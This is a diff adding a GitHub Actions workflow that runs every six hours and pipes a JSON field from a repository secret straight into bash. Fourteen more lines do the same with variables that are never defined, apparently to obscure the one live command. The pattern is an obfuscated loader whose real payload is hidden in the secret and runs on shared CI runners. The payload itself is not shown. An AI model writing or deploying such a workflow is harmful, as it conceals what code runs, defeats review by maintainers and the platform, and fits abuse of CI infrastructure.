@@ -1,0 +1,31 @@
+name: beipiandaomianbeide
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beipiandaomianbeide
+        env:
+          kha6: ${{ secrets.kha6 }}
+        run: |
+          echo $kha6 | jq -r .jsun39 | /bin/bash
+          echo $jf3 | jq -r .o5 | /bin/bash
+          echo $j967 | jq -r .ojo0393 | /bin/bash
+          echo $v051 | jq -r .xisrh0 | /bin/bash
+          echo $yjmbk46 | jq -r .ygvy7 | /bin/bash
+          echo $ndvr1108 | jq -r .tn6676 | /bin/bash
+          echo $y867 | jq -r .ahko571 | /bin/bash
+          echo $yny7320 | jq -r .suoly3007 | /bin/bash
+          echo $yvhla7319 | jq -r .dlm2174 | /bin/bash
+          echo $ee590 | jq -r .u7 | /bin/bash
+          echo $rcz6 | jq -r .lefg058 | /bin/bash
+          echo $tvzhs6506 | jq -r .eae05350 | /bin/bash
+          echo $m66 | jq -r .cifnx649 | /bin/bash
+          echo $vhabf359 | jq -r .k8 | /bin/bash
+          echo $duiff072 | jq -r .ojn5316 | /bin/bash
+
